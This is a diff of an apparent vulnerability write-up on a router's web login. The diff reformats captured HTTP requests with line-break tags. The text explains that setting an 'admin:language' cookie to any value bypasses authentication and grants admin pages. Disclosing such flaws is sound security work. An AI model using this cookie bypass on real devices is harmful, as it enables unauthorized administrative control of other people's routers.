@@ -10,51 +10,51 @@ To understand how this vulnerability works, let's compare an unauthenticated req
 
 **An unauthenticated request looks like this:**
 
-POST /LoginCheck HTTP/1.1
-Host: 192.168.2.1
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Referer: `http://192.168.2.1/login.asp`
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 46
-Origin: `http://192.168.2.1`
-DNT: 1
-Sec-GPC: 1
-Connection: keep-alive
-Cookie: language=en
-Upgrade-Insecure-Requests: 1
-Priority: u=0, i
+POST /LoginCheck HTTP/1.1<br />
+Host: 192.168.2.1<br />
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0<br />
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
+Accept-Language: en-US,en;q=0.5<br />
+Accept-Encoding: gzip, deflate, br<br />
+Referer: `http://192.168.2.1/login.asp`<br />
+Content-Type: application/x-www-form-urlencoded<br />
+Content-Length: 46<br />
+Origin: `http://192.168.2.1`<br />
+DNT: 1<br />
+Sec-GPC: 1<br />
+Connection: keep-alive<br />
+Cookie: language=en<br />
+Upgrade-Insecure-Requests: 1<br />
+Priority: u=0, i<br />
 
 Username=admin&checkEn=0&Password=whatsthepassword
 
-**When the user is authenticated, the request looks like this:**
+**When the user is authenticated, the request looks like this:**<br />
 
-GET /wireless_basic.asp HTTP/1.1
-Host: `192.168.2.1`
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Referer: `http://192.168.2.1/advance.asp`
-DNT: 1
-Sec-GPC: 1
-Connection: keep-alive
-Cookie: language=en; admin:language=en
-Upgrade-Insecure-Requests: 1
-Priority: u=4
+GET /wireless_basic.asp HTTP/1.1<br />
+Host: `192.168.2.1`<br />
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0<br />
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
+Accept-Language: en-US,en;q=0.5<br />
+Accept-Encoding: gzip, deflate, br<br />
+Referer: `http://192.168.2.1/advance.asp`<br />
+DNT: 1<br />
+Sec-GPC: 1<br />
+Connection: keep-alive<br />
+Cookie: language=en; admin:language=en<br />
+Upgrade-Insecure-Requests: 1<br />
+Priority: u=4<br />
 
 
-Key Difference
+Key Difference<br />
 
-The key difference between the two requests is the presence of the following cookie:
+The key difference between the two requests is the presence of the following cookie:<br />
 
 `admin:language=en`
 
-The Vulnerability
+The Vulnerability<br />
 
-This vulnerability is based on the way the application validates session data. By manipulating the admin:language cookie, an unauthenticated user can gain access to authenticated pages.
+This vulnerability is based on the way the application validates session data. By manipulating the admin:language cookie, an unauthenticated user can gain access to authenticated pages.<br />
 Exploit Mechanics
 
 To exploit this vulnerability, all an attacker needs to do is set the cookie admin:language with any arbitrary value. The application will trust this cookie and treat the user as an authenticated admin.
